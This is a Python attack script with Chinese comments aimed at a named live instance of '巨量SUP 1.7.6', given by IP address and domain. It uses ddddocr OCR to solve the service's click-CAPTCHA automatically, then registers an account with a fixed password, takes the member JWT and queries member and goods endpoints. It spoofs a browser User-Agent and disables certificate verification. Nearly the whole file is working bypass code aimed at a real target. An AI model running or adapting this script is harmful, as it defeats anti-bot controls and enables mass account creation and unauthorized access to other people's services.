#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
巨量SUP 1.7.6 —— 点选验证码 OCR 自动求解 + 开放注册造号（拿 member JWT）

用法:
    python juliangsup_captcha_register.py https://45.207.198.244 www.dyy077.top [username]

前置:
    1) 必须用该实例已绑定的租户 Host（未绑定 -> "Domain is not available"）
    2) 证书自签，verify=False；trust_env=False 避免本机代理污染
    3) pip install requests ddddocr pillow

流程:
    GET /api/captcha?mode=click  -> captcha_id + captcha_instruction + base64 图
    ddddocr(det) 出框 -> ddddocr(clf) 识别每个框 -> 按 instruction 字符顺序取框中心
    POST /api/captcha/verify {"captcha_id","clicks":[...]} -> captcha_token
    POST /api/register {... "captcha_code": token} -> member JWT
    Bearer 校验 /api/member/info、/api/goods
"""
import base64
import io
import json
import random
import string
import sys
import time

import requests
import ddddocr
from PIL import Image

if len(sys.argv) < 3:
    print(__doc__)
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
VHOST = sys.argv[2]
USERNAME = sys.argv[3] if len(sys.argv) > 3 else "artex" + "".join(
    random.choices(string.ascii_lowercase + string.digits, k=6)
)
PASSWORD = "Passw0rd2026!"

HEADERS = {
    "Host": VHOST,
    "Origin": "https://" + VHOST,
    "Referer": "https://" + VHOST + "/",
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"),
  "Accept": "application/json, text/plain, */*",
}

s = requests.Session()
s.trust_env = False   # 关键：不走本机代理
s.verify = False      # 自签证书


def grab_captcha():
    """取一条点选验证码（captcha_id 与 token 均一次性，重试必须整条重取）"""
    r = s.get(
        BASE + "/api/captcha",
        params={"mode": "click", "t": int(time.time() * 1000)},
        headers=HEADERS,
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()["data"]
    return data["captcha_id"], data["captcha_instruction"], data["captcha_img"]


def solve_click(instruction, data_url):
    """按 instruction 字形顺序返回点击坐标；识别不全返回 None"""
    raw = base64.b64decode(data_url.split(",", 1)[1])
    img = Image.open(io.BytesIO(raw)).convert("RGB")

    det = ddddocr.DdddOcr(det=True, show_ad=False)
    clf = ddddocr.DdddOcr(show_ad=False)

    boxes = det.detection(raw)          # [[x1,y1,x2,y2], ...]
    cands = []
    for b in boxes:
        x1, y1, x2, y2 = b
        crop = img.crop((x1, y1, x2, y2))
        buf = io.BytesIO()
        crop.save(buf, format="PNG")
        txt = clf.classification(buf.getvalue())
        cands.append((txt, (x1 + x2) // 2, (y1 + y2) // 2))

    chars = [c for c in instruction if c not in "、,， 　"]
    clicks = []
    for ch in chars:                    # 严格按 instruction 顺序，不按坐标排序
        hit = None
        for i, (txt, x, y) in enumerate(cands):
            if txt == ch:
                hit = (x, y)
                cands.pop(i)
                break
        if hit is None:
            return None                 # 有字符没识别出来 -> 换图重试
        clicks.append({"x": hit[0], "y": hit[1]})
    return clicks


def main():
    for attempt in range(1, 8):
        cid, instruction, img = grab_captcha()
        clicks = solve_click(instruction, img)
        if not clicks:
            print("[*] 第 %d 次：识别不全 (%r)，换图" % (attempt, instruction))
            continue

        r = s.post(
            BASE + "/api/captcha/verify",
            headers=HEADERS,
            json={"captcha_id": cid, "clicks": clicks},
            timeout=10,
        )
        j = r.json()
        token = (j.get("data") or {}).get("captcha_token")
        print("[*] verify %s instruction=%r clicks=%s -> %s"
              % (r.status_code, instruction, clicks, j.get("msg")))
        if not token:
            continue                # captcha_id 已被烧掉，重取

        r = s.post(
            BASE + "/api/register",
            headers=HEADERS,
            json={
                "username": USERNAME,
                "password": PASSWORD,
                "email": "",
                "qq": "",
                "invite_code": "",
                "captcha_id": cid,
                "captcha_code": token,
            },
            timeout=10,
        )
        j = r.json()
        print("[*] register %s %s" % (r.status_code, json.dumps(j, ensure_ascii=False)[:300]))
        if j.get("code") != 0:
            continue

        jwt = j["data"]["token"]
        h = dict(HEADERS)
        h["Authorization"] = "Bearer " + jwt

        me = s.get(BASE + "/api/member/info", headers=h, timeout=10)
        goods = s.get(BASE + "/api/goods", params={"page": 1, "size": 100},
                      headers=h, timeout=10)
        print("[+] member/info %s %s" % (me.status_code, me.text[:160]))
        print("[+] goods %s %s" % (goods.status_code, goods.text[:200]))
        print("[+] username=%s password=%s" % (USERNAME, PASSWORD))
        print("[+] JWT=%s" % jwt)
        return

    print("[-] 7 次均失败，检查 Host / 代理 / ddddocr 模型")


if __name__ == "__main__":
    main()
